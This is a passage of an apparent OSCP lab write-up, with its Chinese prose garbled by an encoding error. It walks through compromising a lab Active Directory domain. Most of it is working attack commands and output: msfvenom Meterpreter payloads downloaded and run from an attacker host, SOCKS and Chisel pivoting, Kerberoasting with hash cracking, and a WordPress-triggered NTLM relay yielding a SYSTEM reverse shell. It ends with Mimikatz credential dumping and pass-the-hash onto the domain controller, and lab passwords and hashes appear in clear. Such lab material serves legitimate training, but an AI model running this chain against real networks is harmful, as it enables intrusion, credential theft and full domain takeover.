>å‡è¨­ `INTERNALSRV1` ä¸ŠåŸ·è¡Œä¸€å€‹ Web ä¼ºæœå™¨ã€‚ä¸€æ—¦æˆ‘å€‘åŸ·è¡Œäº† Kerberoasting å¯èƒ½ç²å¾— daniela çš„æ˜æ–‡å¯†ç¢¼ï¼Œå°±å¯ä»¥ä½¿ç”¨å®ƒä¾†å­˜å– `INTERNALSRV1`ã€‚\
>ä½¿ç”¨ Kerberoasting æ”»æ“Šä¾†å–å¾— Hash

#### 3. é€é SOCKS5 Proxy é€²è¡Œå…§ç¶²æƒæ
éœ€è¦å°å…§ç¶²é€²è¡Œ `Nmap` å’Œ `CrackMapExec` æƒæ
#### 3.1 ä½¿ç”¨ msfvenom ç”¢ç”Ÿ Meterpreter Reverse Shell
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.214 LPORT=443 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: met.exe

â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
å•Ÿç”¨ msfconsole  ç›£è½
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ sudo msfconsole -q
[sudo] password for chw: 
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.45.214
LHOST => 192.168.45.214
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > 
[*] Started reverse TCP handler on 192.168.45.214:443 

```
> `set ExitOnSession false`: è¨­å®šç‚º falseï¼Œmulti/handler æœƒä¸€ç›´ä¿æŒé‹è¡Œï¼Œå³ä½¿å·²æœ‰ session é€£ç·šï¼Œä¹Ÿæœƒç¹¼çºŒç­‰å¾…æ–°çš„é€£ç·š\
> `run -j`: background job è®“ handler åœ¨èƒŒæ™¯åŸ·è¡Œï¼Œä¸æœƒå½±éŸ¿ Metasploit console
#### 3.2 åœ¨ CLIENTWK1 ä¸‹è¼‰ä¸¦åŸ·è¡Œ
```
PS C:\Users\marcus> iwr -uri http://192.168.45.214:8000/met.exe -Outfile met.exe
iwr -uri http://192.168.45.214:8000/met.exe -Outfile met.exe
PS C:\Users\marcus> .\met.exe
.\met.exe
```
msfconsole æ”¶åˆ° reverse shell
```
msf6 exploit(multi/handler) > 
[*] Started reverse TCP handler on 192.168.45.214:443 
[*] Sending stage (201798 bytes) to 192.168.117.242
[*] Meterpreter session 1 opened (192.168.45.214:443 -> 192.168.117.242:62790) at 2025-03-18 14:02:09 -0400
```
#### 3.3  åœ¨ Metasploit å»ºç«‹ SOCKS5 Proxy
1. è‡ªå‹•è¨­å®šå…§éƒ¨è·¯ç”± (autoroute)
```
msf6 exploit(multi/handler) > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set session 1
session => 1
msf6 post(multi/manage/autoroute) > run

[*] Running module against CLIENTWK1
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.16.73.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
```
> autoroute modulw æœƒè‡ªå‹•åˆ†æ `CLIENTWK1` é€£æ¥çš„å…§éƒ¨ç¶²æ®µ\
ç™¼ç¾ CLIENTWK1 é€£æ¥åˆ° 172.16.73.0/24ï¼Œä¸¦è‡ªå‹•å»ºç«‹è·¯ç”±\
ç¾åœ¨ Kali å¯ä»¥é€é CLIENTWK1 å­˜å– 172.16.73.0/24 å…§ç¶²

2. å»ºç«‹ SOCKS5 Proxy
```
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5
msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 1.
msf6 auxiliary(server/socks_proxy) > 
[*] Starting the SOCKS proxy server

```
> å•Ÿå‹• SOCKS5 ä»£ç†ä¼ºæœå™¨ï¼Œè®“ Kali é€é CLIENTWK1 ä¾†å­˜å– 172.16.73.0/24\
`SRVHOST 127.0.0.1`: åªå…è¨±æœ¬æ©Ÿ (Kali) ä½¿ç”¨ proxy\
å› æ­¤å¯ä»¥ä½¿ç”¨ proxychains é€é CLIENTWK1 æƒæå’Œå­˜å–å…§éƒ¨ç¶²è·¯

æª¢æŸ¥å…ˆå‰ç« ç¯€çš„è¨­å®šé‚„åœ¨
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ cat /etc/proxychains4.conf
...
socks5  127.0.0.1 1080
```

#### 3.4 é€é CrackMapExec æƒæ SMB share
ä½¿ç”¨ proxychains æšèˆ‰å…§éƒ¨ SMB
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ proxychains -q crackmapexec smb 172.16.73.240-241 172.16.73.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares --no-bruteforce
SMB         172.16.73.240    445    DCSRV1           [*] Windows 10.0 Build 20348 x64 (name:DCSRV1) (domain:beyond.com) (signing:True) (SMBv1:False)
SMB         172.16.73.241    445    INTERNALSRV1     [*] Windows 10.0 Build 20348 x64 (name:INTERNALSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         172.16.73.254    445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         172.16.73.240    445    DCSRV1           [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.73.241    445    INTERNALSRV1     [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.73.240    445    DCSRV1           [+] Enumerated shares
SMB         172.16.73.240    445    DCSRV1           Share           Permissions     Remark
SMB         172.16.73.240    445    DCSRV1           -----           -----------     ------
SMB         172.16.73.240    445    DCSRV1           ADMIN$                          Remote Admin
SMB         172.16.73.240    445    DCSRV1           C$                              Default share
SMB         172.16.73.240    445    DCSRV1           IPC$            READ            Remote IPC
SMB         172.16.73.240    445    DCSRV1           NETLOGON        READ            Logon server share 
SMB         172.16.73.240    445    DCSRV1           SYSVOL          READ            Logon server share 
SMB         172.16.73.241    445    INTERNALSRV1     [+] Enumerated shares
SMB         172.16.73.241    445    INTERNALSRV1     Share           Permissions     Remark
SMB         172.16.73.241    445    INTERNALSRV1     -----           -----------     ------
SMB         172.16.73.241    445    INTERNALSRV1     ADMIN$                          Remote Admin
SMB         172.16.73.241    445    INTERNALSRV1     C$                              Default share
SMB         172.16.73.241    445    INTERNALSRV1     IPC$            READ            Remote IPC
SMB         172.16.73.254    445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.73.254    445    MAILSRV1         [+] Enumerated shares
SMB         172.16.73.254    445    MAILSRV1         Share           Permissions     Remark
SMB         172.16.73.254    445    MAILSRV1         -----           -----------     ------
SMB         172.16.73.254    445    MAILSRV1         ADMIN$                          Remote Admin
SMB         172.16.73.254    445    MAILSRV1         C$                              Default share
SMB         172.16.73.254    445    MAILSRV1         IPC$            READ            Remote IPC
```
> 172.16.73.240 (DCSRV1)  - å¯è®€å– `NETLOGON` å’Œ `SYSVOL`\
172.16.73.241 (INTERNALSRV1) - åªæœ‰é è¨­å…±äº« (ç„¡æ¬Šé™)\
172.16.73.254 (MAILSRV1) - åªæœ‰é è¨­å…±äº« (ç„¡æ¬Šé™)

#### 3.5 é€é Nmap æƒæå…§éƒ¨ Web æœå‹™
```
â”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.73.240 172.16.73.241 172.16.73.254
[sudo] password for chw: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-18 14:31 EDT
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 172.16.73.240
Host is up (2.6s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  closed http
443/tcp closed https

Nmap scan report for 172.16.73.241
Host is up (5.3s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  open   http
443/tcp open   https

Nmap scan report for 172.16.73.254
Host is up (2.6s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  open   http
443/tcp closed https

Nmap done: 3 IP addresses (3 hosts up) scanned in 42.35 seconds
```
> DCSRV1 (172.16.73.240): ç„¡ Web æœå‹™\
INTERNALSRV1 (172.16.73.241): HTTP (80) å’Œ HTTPS (443) é–‹å•Ÿ\
MAILSRV1 (172.16.73.254): HTTP (80) é–‹å•Ÿ
>> å¯ç¢ºèª INTERNALSRV1 èˆ‡ MAILSRV1 æœ‰ Web æœå‹™

#### 3.6 é€é Chisel ç€è¦½ INTERNALSRV1 Web æœå‹™
1. åœ¨ Kali å•Ÿå‹• Chisel Server
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ cp /usr/bin/chisel .                                           
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ chmod a+x chisel
    
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ ./chisel server -p 8080 --reverse
2025/03/18 14:36:09 server: Reverse tunnelling enabled
2025/03/18 14:36:09 server: Fingerprint VbGEO884eECfHw8SWkKLxuZkJEG0FURB/tJ8RauoI/o=
2025/03/18 14:36:09 server: Listening on http://0.0.0.0:8080

```
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ cp /home/chw/Chisel_x64/chisel ./chisel_x64

â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```
åœ¨ CLIENTWK1 åŸ·è¡Œ Chisel ä¸¦é€²è¡Œåå‘é€£ç·š
```
PS C:\Users\marcus> iwr -uri http://192.168.45.214:8888/chisel_x64 -Outfile chisel.exe 
iwr -uri http://192.168.45.214:8888/chisel_x64 -Outfile chisel.exe
2025/03/11 15:01:46 client: Connecting to ws://192.168.119.5:8080
2025/03/11 15:01:46 client: Connected (Latency 11.0449ms)
```

2. å˜—è©¦ç™»å…¥ WordPress
å‰å¾€ç®¡ç†é é¢ http://127.0.0.1/wordpress/wp-admin æœƒè·³è½‰è‡³ `internalsrv1.beyond.com`\
æ‰‹å‹•åŠ å…¥ `/etc/hosts`
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ vi /etc/hosts  
...
127.0.0.1    internalsrv1.beyond.com
```
æ‰“é–‹ /wp-admin\
![image](https://hackmd.io/_uploads/BkEQ7rDn1l.png)

## Attacking an Internal Web Application
ç›®æ¨™ï¼š
- å° daniela é€²è¡Œ Kerberoastingï¼Œå–å¾— WordPress ç™»å…¥å¯†ç¢¼
- æ¿«ç”¨ WordPress Pluginï¼Œç™¼å‹• NTLM Relay æ”»æ“Šï¼Œå–å¾— MAILSRV1 çš„ SYSTEM æ¬Šé™

### Speak Kerberoast and Enter
INTERNALSRV1 ä¸Šçš„ Web Application æ˜¯ç›®å‰æœ€æœ‰å¸Œæœ›çš„ç›®æ¨™ã€‚å› ç‚ºæ˜¯ä¸€å€‹ WordPress ç¶²ç«™
#### Kerberoasting å–å¾— daniela çš„å¯†ç¢¼
- daniela æ˜¯ Kerberoastable
- SPN æ˜¯ `http/internalsrv1.beyond.com `ï¼Œè¡¨ç¤ºå¯èƒ½æœ‰ WordPress ç®¡ç†æ¬Šé™
#### 1. åˆ©ç”¨ impacket-GetUserSPNs å–å¾— TGS-REP Hash
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.73.240 beyond.com/john

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName      Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
------------------------  -------  --------  --------------------------  --------------------------  ----------
http/internalsrv1.beyond.com  daniela            2025-03-11 16:17:20.062328  2025-03-11 16:59:48.376728             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$4c6c4600baa0ef09e40fde6130e3d770$49023c03dcf9a21ea5b943e179f843c575d8f54b1cd85ab12658364c23a46fa53b3db5f924a66b1b28143f6a357abea0cf89af42e08fc38d23b205a3e1b46aed9e181446fa7002def837df76ca5345e3277abaa86...
2e430c5a8f0235b45b66c5fe0c8b4ba16efc91586fc22c2c9c1d8d0434d4901d32665cceac1ab0cdcb89ae2c2d688307b9c5d361beba29b75827b058de5a5bba8e60af3562f935bd34feebad8e94d44c0aebc032a3661001541b4e30a20d380cac5047d2dafeb70e1ca3f9e507eb72a4c7
```
> æˆåŠŸå–å¾— daniela çš„ `TGS-REP Hash`

#### 2. ä½¿ç”¨ Hashcat ç ´è§£å¯†ç¢¼
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
...
$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$b0750f4754ff26fe77d2288ae3cca539$0922083b88587a2e765298cc7d499b368f7c39c7f6941a4b419d8bb1405e7097891c1af0a885ee76ccd1f32e988d6c4653e5cf4ab9602004d84a6e1702d2fbd5a3379bd376de696b0e8993aeef5b1e78fb24f5d3c
...
3d3e9d5c0770cc6754c338887f11b5a85563de36196b00d5cddecf494cfc43fcbef3b73ade4c9b09c8ef405b801d205bf0b21a3bca7ad3f59b0ac7f6184ecc1d6f066016bb37552ff6dd098f934b2405b99501f2287128bff4071409cec4e9545d9fad76e6b18900b308eaac8b575f60bb:DANIelaRO123
...
```
> `daniela`:`DANIelaRO123`

#### 3. ç™»å…¥ INTERNALSRV1 çš„ WordPress
ç™»å…¥ http://127.0.0.1/wordpress/wp-admin\
![image](https://hackmd.io/_uploads/ByM26jw2ye.png)

### Abuse a WordPress Plugin for a Relay Attack

#### 1. ç€è¦½ WordPress è¨­å®š
- daniela æ˜¯å”¯ä¸€çš„ WordPress ä½¿ç”¨è€…
![image](https://hackmd.io/_uploads/rkqmAoD2yl.png)
- å”¯ä¸€å•Ÿç”¨çš„ Plugin æ˜¯ `Backup Migration`
![image](https://hackmd.io/_uploads/Bku40svnyl.png)
- å¤–æ›å…è¨±è‡ªå®šç¾©ã€Œå‚™ä»½ç›®æ¨™ç›®éŒ„ã€
![image](https://hackmd.io/_uploads/rk6cRiD3kg.png)
> å¯ä»¥ç•¶ä½œç›®æ¨™è¨­ç‚ºæ”»æ“Šæ©Ÿå™¨ä¾†èª˜å°ç›®æ¨™ä¼ºæœå™¨é€²è¡Œèº«ä»½é©—è­‰
#### 2. NTLM Relay æ”»æ“Šè¨ˆç•«
- `INTERNALSRV1` çš„æœ¬æ©Ÿç®¡ç†å“¡ (Administrator) å¯èƒ½èˆ‡ `MAILSRV1` çš„ç®¡ç†å“¡ä½¿ç”¨ç›¸åŒå¯†ç¢¼
- MAILSRV1 ç¦ç”¨ SMB signingï¼Œå¯é€²è¡Œ NTLM Relay æ”»æ“Š
- åˆ©ç”¨ WordPress  Plugin è¨­å®šå‚™ä»½ç›®æ¨™ç‚ºæˆ‘å€‘çš„ Kali æ©Ÿå™¨ (//192.168.45.214/test)
    - é€™å°‡å°è‡´ `INTERNALSRV1` å˜—è©¦å° Kali é€²è¡Œèº«ä»½é©—è­‰
    - å¯ä»¥æ””æˆª NTLM é©—è­‰ï¼Œä¸¦å°‡å…¶è½‰ç™¼åˆ° `MAILSRV1` ä»¥ç²å¾— SYSTEM æ¬Šé™

#### 3. è¨­ç½® NTLM Relay æ”»æ“Š
##### 3.1 å•Ÿå‹• impacket-ntlmrelayx
å•Ÿå‹• impacket-ntlmrelayx
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.45.214 -c "powershell -enc JABjAGwAaQ..."
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```
> `impacket-ntlmrelayx`ï¼šä½¿ç”¨ Impacket å·¥å…·å¥—ä»¶ä¾†åŸ·è¡Œ NTLM Relay æ”»æ“Š\
> `--no-http-server`: é—œé–‰ HTTP ä¼ºæœå™¨\
> `-smb2support`: å•Ÿç”¨å° SMBv2 çš„æ”¯æ´\
> `-t 192.168.45.214`: æŒ‡å®šæ”»æ“Šç›®æ¨™ï¼ˆå°‡ NTLM é©—è­‰è«‹æ±‚è½‰ç™¼åˆ°çš„æ©Ÿå™¨ï¼‰\
> Revers shell : [powershell_reverse_shell.ps1](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)

kali é–‹å•Ÿ nc ç›£è½ï¼š
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ nc -nvlp 9999
listening on [any] 9999 ...
```
##### 3.2 è¨­ç½® WordPress Backup Migration Plugin
å°‡å‚™ä»½ç›®éŒ„è¨­å®šç‚º Kali SMB ä¼ºæœå™¨ (192.168.45.214)
```
//192.168.45.214/test
```
> å¼·åˆ¶ INTERNALSRV1 å‘ Kali ä¼ºæœå™¨é€²è¡Œ NTLM èº«ä»½é©—è­‰\
> "SAVE"

(impacket-ntlmrelayx)
```
â””â”€$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.45.214 -c "powershell -enc JABjAGwAaQ..."
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
...
[*] Servers started, waiting for connections
...
[*] Authenticating against smb://192.168.117.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
...
[*] Service RemoteRegistry is in stopped state
...
[*] Starting service RemoteRegistry
...
[*] Executed specified command on host: 192.168.117.242
...
[*] Stopping service RemoteRegistry
```
(Kali listenning Port)
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ nc -nvlp 9999
listening on [any] 9999 ...
connect to [192.168.45.214] from (UNKNOWN) [192.168.117.242] 50063
whoami
nt authority\system

PS C:\Windows\system32> hostname
MAILSRV1

PS C:\Windows\system32> 
```

`MAILSRV1` ä¸Šçš„ NT AUTHORITY\SYSTEM å¯ä»¥å­˜å– MAILSRV1 ä¸Š beccy çš„ NTLM hash\
ğŸ¯ é€²ä¸€æ­¥å–å¾— Domain Controller (`DCSRV1`) çš„æ§åˆ¶æ¬Š

## Gaining Access to the Domain Controller
### Cached Credentials
>[!Tip]
>Depending on the objective of the penetration test, we should not skip the local enumeration of the MAILSRV1 system. This could reveal additional vulnerabilities and sensitive information, which we may miss if we directly attempt to extract the NTLM hash for beccy.

#### 1. ä¸‹è¼‰ä¸¦åŸ·è¡Œ Meterpreter å–å¾—æ›´å¼·å¤§çš„ shell
```
PS C:\Windows\system32> cd C:\Users\Administrator

PS C:\Users\Administrator> iwr -uri http://192.168.45.214:8000/met.exe -Outfile met.exe

PS C:\Users\Administrator> .\met.exe
```
( åœ¨ Kali ä¸Šæ¥æ”¶ `MAILSRV1` çš„ Meterpreter)
```
[*] Sending stage (200774 bytes) to 192.168.117.242
[*] Meterpreter session 2 opened (192.168.45.214:443 -> 192.168.117.242:50814)

msf6 post(multi/manage/autoroute) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > shell
Process 416 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\Administrator> 
```
#### 2. ä¸‹è¼‰ä¸¦åŸ·è¡Œ Mimikatz å–å¾— beccy çš„æ†‘è­‰
```
PS C:\Users\Administrator> iwr -uri http://192.168.45.214:8000/mimikatz.exe -Outfile mimikatz.exe

PS C:\Users\Administrator> .\mimikatz.exe
.\mimi.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Mar 19 2025 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
  ...
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
...
Authentication Id : 0 ; 253683 (00000000:0003def3)
Session           : Interactive from 1
User Name         : beccy
Domain            : BEYOND
Logon Server      : DCSRV1
Logon Time        : 3/8/2023 4:50:32 AM
SID               : S-1-5-21-1104084343-2915547075-2081307249-1108
        msv :
         [00000003] Primary
         * Username : beccy
         * Domain   : BEYOND
         * NTLM     : f0397ec5af49971f6efbdb07877046b3
         * SHA1     : 2d878614fb421517452fd99a3e2c52dee443c8cc
         * DPAPI    : 4aea2aa4fa4955d5093d5f14aa007c56
        tspkg :
        wdigest :
         * Username : beccy
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : beccy
         * Domain   : BEYOND.COM
         * Password : NiftyTopekaDevolve6655!#!
...
```
> beccy:
> - NTLM Hash `f0397ec5af49971f6efbdb07877046b3`
> - æ˜æ–‡å¯†ç¢¼ `NiftyTopekaDevolve6655!#!`

#### 3. å­˜å„²æ†‘è­‰ï¼Œå…¥ä¾µ DCSRV1
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ cat creds.txt
...
beccy:NiftyTopekaDevolve6655!#!
beccy NTLM Hash: f0397ec5af49971f6efbdb07877046b3
```
### Lateral Movement
ä½¿ç”¨ beccy çš„ NTLM Hash é€é `impacket-psexec` å–å¾— DCSRV1 çš„æ§åˆ¶æ¬Š
> é€é Pass-the-Hash (PTH) æ”»æ“Šï¼Œä½¿ç”¨ impacket-psexec å–å¾— DCSRV1 çš„ SYSTEM æ¬Šé™

```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.73.240
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 172.16.73.240.....
[*] Found writable share ADMIN$
[*] Uploading file CGOrpfCz.exe
[*] Opening SVCManager on 172.16.73.240.....
[*] Creating service tahE on 172.16.73.240.....
[*] Starting service tahE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.


C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DCSRV1

C:\Windows\system32> ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.73.240
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.73.254
```
>[!Important]
>æˆåŠŸæ§åˆ¶ BEYOND.COM ç¶²åŸŸ\
>ğŸ’¡ æ¥ä¸‹ä¾†å¯ä»¥åŸ·è¡Œ `DCSync` æˆ– `Mimikatz` ä¾†æ“·å–å®Œæ•´çš„ç¶²åŸŸå¯†ç¢¼é›œæ¹Šï¼Œå»ºç«‹ Persistence

## Report
- [Penetration_Testing_Report.pdf](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/misc/assembling_the_pieces/daeebbc40a5cfbb70d96f6b10104b453-assemble_flag.pdf)


>[!Caution]
>Offsec:\
>"**Don't give up, and remember the Try Harder -mindset!**"\
>([ğ„ BGM ğŸµ](https://youtu.be/t-bgRQfeW64?si=vW85In80qfVBfStn))\
>![image](https://hackmd.io/_uploads/By6nJpvhJx.png)

##### tags: `offsec` `oscp` `oscp+` `web security` `pentesting` `red team`
